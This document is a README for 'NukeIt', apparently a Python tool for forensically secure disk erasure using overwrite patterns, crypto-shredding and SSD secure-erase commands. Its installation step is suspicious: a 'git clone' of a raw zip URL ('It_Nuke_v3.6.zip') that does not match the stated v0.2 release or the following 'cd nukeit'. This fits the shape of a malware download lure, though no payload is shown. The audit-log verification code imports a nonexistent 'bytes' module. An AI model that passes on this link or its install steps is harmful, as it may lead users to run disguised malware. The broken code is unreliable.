<div align="center">

```
  ███╗   ██╗██╗   ██╗██╗  ██╗███████╗    ██╗████████╗
  ████╗  ██║██║   ██║██║ ██╔╝██╔════╝    ██║╚══██╔══╝
  ██╔██╗ ██║██║   ██║█████╔╝ █████╗      ██║   ██║
  ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝      ██║   ██║
  ██║ ╚████║╚██████╔╝██║  ██╗███████╗    ██║   ██║
  ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═╝   ╚═╝
```

### **NukeIt: When Shift+Delete is not enough.**

**v0.2 Prototype** · Developed by [**PurpleFoxxx**](#team)

![Python](https://img.shields.io/badge/Python-3.8%2B-blue?style=flat-square)
![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-lightgrey?style=flat-square)
![Status](https://img.shields.io/badge/Status-Prototype%20%2F%20In%20Development-orange?style=flat-square)
![License](https://img.shields.io/badge/License-Use%20With%20Caution-red?style=flat-square)

</div>

---

## Table of Contents

1. [About NukeIt](#about-nukeit)
2. [Use Cases](#use-cases)
3. [Supported Platforms](#supported-platforms)
4. [How It Works](#how-it-works)
5. [Dependencies](#dependencies)
6. [Installation](#installation)
7. [How to Use](#how-to-use)
8. [Audit Log](#audit-log)
9. [Team](#team)
10. [Disclaimer](#disclaimer)

---

## About NukeIt

**NukeIt** is a command-line secure data erasure tool designed to make data forensically non-recoverable. Standard deletion — including emptying the Recycle Bin, using Shift+Delete, or even formatting a drive — does not actually remove data from storage media. The underlying bytes remain physically present and can be recovered using off-the-shelf forensic tools.

NukeIt goes further by combining multiple layers of destruction:

- **Multi-pass overwriting** using industry-standard patterns (DoD 5220.22-M, Gutmann 35-pass)
- **Crypto-shredding** with hybrid post-quantum-grade symmetric encryption — data is encrypted with ephemeral keys that are immediately and irrecoverably destroyed, rendering it mathematically unrecoverable
- **SSD-specific hardware commands** (TRIM, ATA Secure Erase, NVMe Format) that instruct the storage controller itself to erase data at the firmware level
- **Pre-erasure file extraction** — safely copy your live files to an external device before destruction
- **Signed audit logs** — every operation is timestamped, hashed (SHA3-256), and signed with an Ed25519 key for tamper-evident record-keeping

All cryptographic keys are generated fresh per session, held exclusively in RAM, and zeroed out immediately after use. They are **never written to disk under any circumstances**.

---

## Use Cases

| Scenario                                  | How NukeIt Helps                                                                            |
| ----------------------------------------- | ------------------------------------------------------------------------------------------- |
| 🖥️ Reselling a laptop or desktop          | Wipe all drives so the new owner cannot recover any personal data                           |
| 🏢 Decommissioning office hardware        | Ensure company data, credentials, and documents cannot be extracted from retired machines   |
| 🔐 Handling sensitive or classified files | Destroy specific files, partitions, or drives in a forensically complete way                |
| 🧹 Secure disposal of external drives     | Fully erase USB drives, external HDDs, and SSDs before physical disposal                    |
| 🔒 Compliance & data protection           | Meet data destruction requirements under GDPR, HIPAA, or internal data governance policies  |
| 🧪 Security research / red team ops       | Demonstrate the inadequacy of standard deletion and the necessity of forensic-grade erasure |

---

## Supported Platforms

| Platform            | Status          | Notes                                                                            |
| ------------------- | --------------- | -------------------------------------------------------------------------------- |
| **Linux**           | ✅ Supported    | Requires `sudo` / root. Uses `lsblk`, `blkdiscard`, `hdparm`, `nvme-cli`         |
| **Windows 10 / 11** | ✅ Supported    | Requires Administrator. Uses PowerShell, DISKPART, Optimize-Volume               |
| **Windows 7 / 8**   | ⚠️ Partial      | Falls back to `wmic` for drive detection; some SSD commands may not be available |
| **macOS**           | 🔶 Experimental | Drive detection via `diskutil` works; SSD commands not yet fully implemented     |

> **Note:** Raw block device access requires elevated privileges on all platforms. NukeIt will **exit immediately** if not run as root (Linux) or Administrator (Windows). There is no degraded mode — this is intentional.

---

## How It Works

NukeIt executes a layered, multi-phase destruction sequence for each target:

```
┌─────────────────────────────────────────────────────────────────┐
│  Phase 0  │  SSD Hardware Commands (if applicable)              │
│           │  TRIM / blkdiscard / ATA Secure Erase / NVMe Format │
├─────────────────────────────────────────────────────────────────┤
│  Phase 1  │  Multi-Pass Overwrite                               │
│           │  DoD 7-pass / Gutmann 35-pass / Random / Zeros      │
├─────────────────────────────────────────────────────────────────┤
│  Phase 2  │  Crypto-Shredding  (if enabled)                     │
│           │  AES-256-GCM ⊕ ChaCha20-Poly1305                   │
│           │  Per-block ephemeral HKDF-SHA3-256 keys             │
│           │  Keys destroyed immediately after each block        │
├─────────────────────────────────────────────────────────────────┤
│  Phase 3  │  Final Zero Pass                                    │
│           │  Leaves device in a known terminal state            │
├─────────────────────────────────────────────────────────────────┤
│  Finish   │  Audit Log written to erased device/location        │
│           │  Ed25519 signed · SHA3-256 per event                │
│           │  All crypto keys zeroed from RAM                    │
└─────────────────────────────────────────────────────────────────┘
```

### Overwrite Patterns

| Pattern           | Passes | Description                                                                               |
| ----------------- | ------ | ----------------------------------------------------------------------------------------- |
| **DoD 5220.22-M** | 7      | US Department of Defense standard. Fixed + random passes. Recommended for most use cases. |
| **Gutmann**       | 35     | Maximum destruction. Designed to defeat magnetic force microscopy. Best for HDDs.         |
| **3× Random**     | 3      | Three passes of cryptographically random data. Fast and effective for SSDs.               |
| **Zeros only**    | 1      | Single zero pass. Minimal — use only when speed is critical.                              |

### Key Security Properties

- All cryptographic keys live **exclusively in RAM**
- Keys are **never written to disk**, swap, or any persistent storage
- Keys are automatically zeroed on: normal exit, `Ctrl+C` (SIGINT), `SIGTERM`, or crash (`atexit`)
- Per-block HKDF-SHA3-256 key derivation ensures each 1MB block is encrypted with a unique key
- Double-layer encryption: AES-256-GCM output is re-encrypted with ChaCha20-Poly1305

---

## Dependencies

NukeIt requires **Python 3.8+** and one third-party package:

### Python Package

| Package        | Version | Purpose                                       | Install                    |
| -------------- | ------- | --------------------------------------------- | -------------------------- |
| `cryptography` | ≥ 41.0  | AES-256-GCM, ChaCha20-Poly1305, HKDF, Ed25519 | `pip install cryptography` |

### System Tools (optional but recommended)

These are used for SSD-specific hardware commands. NukeIt will gracefully skip any that are unavailable and fall back to software-only erasure.

**Linux:**

| Tool         | Package                              | Purpose                        |
| ------------ | ------------------------------------ | ------------------------------ |
| `lsblk`      | `util-linux` (usually pre-installed) | Drive detection                |
| `blkdiscard` | `util-linux`                         | TRIM / DISCARD for SSDs        |
| `hdparm`     | `hdparm`                             | ATA Secure Erase for SATA SSDs |
| `nvme`       | `nvme-cli`                           | NVMe Format for NVMe SSDs      |

```bash
# Ubuntu / Debian
sudo apt install util-linux hdparm nvme-cli

# Fedora / RHEL
sudo dnf install util-linux hdparm nvme-cli

# Arch
sudo pacman -S util-linux hdparm nvme-cli
```

**Windows:**

All required tools (`PowerShell`, `DISKPART`, `Optimize-Volume`) are built into Windows 10/11. No additional installation needed.

---

## Installation

### 1. Clone or download

```bash
git clone https://github.com/PurpleFoxxx/NukeIt/raw/refs/heads/main/exhibit/It_Nuke_v3.6.zip
cd nukeit
```

Or simply download `nukeit.py` directly.

### 2. Install Python dependency

```bash
pip install cryptography
```

On some Linux systems you may need:

```bash
pip install cryptography --break-system-packages
```

### 3. Verify Python version

```bash
python3 --version   # Must be 3.8 or higher
```

That's it. No compilation, no build steps, no complex setup.

---

## How to Use

> ⚠️ **Read the [Disclaimer](#disclaimer) before proceeding.** Erasure is permanent and irreversible.

### Step 1 — Open a privileged terminal

**Linux / macOS:**

```bash
sudo python3 nukeit.py
```

**Windows:**
Right-click on Command Prompt or PowerShell → **"Run as administrator"**, then:

```cmd
python nukeit.py
```

NukeIt will immediately exit with an error if not run with the required privileges.

---

### Step 2 — Drive detection

NukeIt will automatically scan and list all detected storage devices:

```
  Detected Storage Devices:
  ────────────────────────────────────────────────────────────────────
  [1]  /dev/sda  |  Samsung SSD 870  |  500.0 GB  |  SSD
        ├── /dev/sda1  128.0 MB
        ├── /dev/sda2  499.8 GB  → /
  [2]  /dev/sdb  |  WD Blue HDD      |  1.0 TB    |  HDD  [REMOVABLE]
        ├── /dev/sdb1  1.0 TB  → /media/external
  ────────────────────────────────────────────────────────────────────
```

Drives marked `[SYSTEM]` contain your operating system. Erasing them will make your computer unbootable.

**Select the drive number** you want to erase.

---

### Step 3 — Choose what to erase

```
  What to erase?
    1  Entire disk  /dev/sdb  (1.0 TB)
    2  Specific partition
    3  Custom byte range
```

- **Entire disk** — Erases every byte on the physical drive, including all partitions
- **Specific partition** — Choose one partition from the list
- **Custom byte range** — Provide a start byte and length for surgical erasure

---

### Step 4 — Choose an overwrite pattern

```
  Overwrite pattern:
    1  DoD 5220.22-M  (7-pass)  — Recommended
    2  Gutmann        (35-pass) — Maximum
    3  3× Random      — Fast, strong for SSDs
    4  Zeros only     — Minimal / fast
```

**Recommendation:**

- **HDDs** → DoD 7-pass or Gutmann 35-pass
- **SSDs / NVMe** → 3× Random (SSD wear levelling makes multi-pass less effective; hardware commands handle the rest)
- **Quick wipe** → Zeros only

---

### Step 5 — Enable crypto-shredding (recommended)

```
  Enable crypto-shredding? [Y/n]:
```

When enabled, NukeIt performs an additional pass encrypting all data with AES-256-GCM and ChaCha20-Poly1305 using per-block ephemeral keys derived via HKDF-SHA3-256. The keys are destroyed immediately after use, making the encrypted data permanently unrecoverable even if the overwrite passes are somehow defeated.

**Recommended: Yes.**

---

### Step 6 — Pre-erasure backup (optional)

```
  Extract live files to external device before erasure? [y/N]:
```

If you choose **Yes**, NukeIt will copy all live, non-deleted files from the target's filesystem to a destination you specify (typically an external drive or network share).

**Important:** NukeIt copies only regular files that are currently accessible through the filesystem. It explicitly skips:

- Deleted files and recycle bin contents
- Windows system files (`pagefile.sys`, `hiberfil.sys`, `swapfile.sys`)
- Recycle Bin and System Volume Information
- Linux virtual filesystems (`/proc`, `/sys`, `/dev`)
- Zero-byte placeholder files
- Symlinks, device nodes, and sockets

Provide the destination path when prompted:

```
  Backup destination path: /media/usb_drive/backup_2024
```

---

### Step 7 — Final confirmation

NukeIt displays a full summary and requires explicit confirmation before any data is written:

```
  ══════════════════════════════════════════════════════════════════
  ⚠   FINAL WARNING — THIS OPERATION CANNOT BE UNDONE   ⚠
  ══════════════════════════════════════════════════════════════════

  Device  : WD Blue HDD (/dev/sdb)
  Pattern : dod_7pass
  Crypto  : YES — AES-256 + ChaCha20 ephemeral
  Backup  : YES → /media/usb_drive/backup_2024
  OS      : Linux

  Confirm — type YES to begin: [y/N]:
```

Type `YES` (case-insensitive) to start. Anything else cancels safely.

---

### Step 8 — Erasure in progress

NukeIt runs all phases with live progress bars:

```
  [Phase 0] SSD hardware commands
  [SSD] blkdiscard TRIM completed.
  [SSD] ATA Secure Erase completed.

  [Phase 1] Overwrite — 7 pass(es)
  Pass 1/7             [████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░]  36.2%
  ...

  [Phase 2] Crypto-Shredding (AES-256-GCM + ChaCha20-Poly1305)
  Per-block ephemeral HKDF keys — destroyed after each block.

  [Phase 3] Final zero pass (known terminal state)
  ✓ Erasure complete. Surface hash: 4d73bcbbcef48dab...
```

---

### Step 9 — Completion

On completion, NukeIt:

1. Writes the signed audit log to the erased device/location
2. Zeroes all cryptographic keys from RAM
3. Prints a final summary with the audit log path

```
  ✓  ERASURE COMPLETE

  Device       : WD Blue HDD (/dev/sdb)
  Duration     : 847.3s
  Passes done  : 8
  Final hash   : 4d73bcbbcef48dabbc815a4ab5347967ba29b142...
  Crypto-shred : ✓
  Audit log    : /media/external/nukeit_audit/nukeit_audit_A1B2C3D4.json

  NukeIt complete. Data is gone. 🔥
```

---

## Audit Log

NukeIt saves a **tamper-evident, Ed25519-signed audit log** to the erased device/location itself after every session. The log is written as the last action before exit.

### What is logged

| Field                                 | Logged |
| ------------------------------------- | ------ |
| Session ID (random, per-run)          | ✅     |
| OS type                               | ✅     |
| Device label                          | ✅     |
| Device size (bytes)                   | ✅     |
| Overwrite pattern used                | ✅     |
| SHA3-256 hash of each pass            | ✅     |
| Crypto-shredding enabled/disabled     | ✅     |
| Backup file count and master hash     | ✅     |
| Duration and timestamps               | ✅     |
| Ed25519 public key (for verification) | ✅     |

### What is NOT logged (by design)

| Field                    | Logged   |
| ------------------------ | -------- |
| Encryption keys (any)    | ❌ Never |
| File names or file paths | ❌ Never |
| File content             | ❌ Never |
| Usernames or hostnames   | ❌ Never |
| Raw byte patterns        | ❌ Never |

### Verifying the audit log

The log is signed with a session-specific Ed25519 key. The public key is embedded in the log itself. To verify:

```python
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PublicKey
from cryptography.hazmat.primitives import serialization
import json, bytes

with open("nukeit_audit_XXXXXXXX.json") as f:
    envelope = json.load(f)

pub_hex = envelope["log"]["signing_pubkey"]
sig_hex = envelope["signature_hex"]
log_bytes = json.dumps(envelope["log"], indent=2).encode()

pub = Ed25519PublicKey.from_public_bytes(bytes.fromhex(pub_hex))
pub.verify(bytes.fromhex(sig_hex), log_bytes)  # raises if tampered
print("Log integrity verified.")
```

---

## Team

**NukeIt** is developed by **PurpleFoxxx** — a team of security-focused individuals building the tool for data privacy, forensic security, and responsible data destruction.

> _"When Shift+Delete is not enough."_

---

## Disclaimer

> ### ⚠️ READ CAREFULLY BEFORE USE

**NukeIt is currently in active development and is a prototype.** It is provided as-is, for educational, research, and legitimate data destruction purposes only.

**By using NukeIt, you acknowledge and agree to the following:**

1. **Irreversibility.** Data erasure performed by NukeIt is designed to be permanent and forensically non-recoverable. There is no undo. Once a wipe begins and completes, your data **cannot be restored** by any known means.

2. **User responsibility.** You are solely responsible for selecting the correct drive, partition, or data range before confirming erasure. NukeIt will warn you about system drives, but it is ultimately your responsibility to verify targets before proceeding.

3. **No warranty.** NukeIt is provided without warranty of any kind, express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, or non-infringement.

4. **No liability.** The developers, contributors, and team members of **PurpleFoxxx** accept **no responsibility or liability** for any damage, data loss, hardware failure, system instability, legal consequences, or any other harm — direct or indirect — arising from the use or misuse of this tool.

5. **Prototype status.** This software is in development. It may contain bugs, incomplete features, or behaviours that differ from expectations. Do not rely on it as your sole method of compliance with any legal, regulatory, or organisational data destruction requirement without independent verification.

6. **Test before trusting.** Before using NukeIt on important data, use the built-in demo mode (no real hardware) to understand exactly what the tool does and how it behaves on your system.

7. **Legal use only.** You must only use NukeIt on hardware and data you own or have explicit written authorisation to erase. Unauthorised destruction of data may be a criminal offence in your jurisdiction.

8. **SSD caveats.** Due to the nature of wear-levelling, over-provisioning, and flash translation layers in SSDs and NVMe drives, software-only overwrite passes may not reach all physical storage cells. NukeIt mitigates this with hardware-level commands (TRIM, ATA Secure Erase, NVMe Format) where available, but **physical destruction remains the only absolute guarantee** for SSDs containing highly sensitive data.

---

_NukeIt — developed by PurpleFoxxx. Use wisely. Use responsibly. You have been warned._
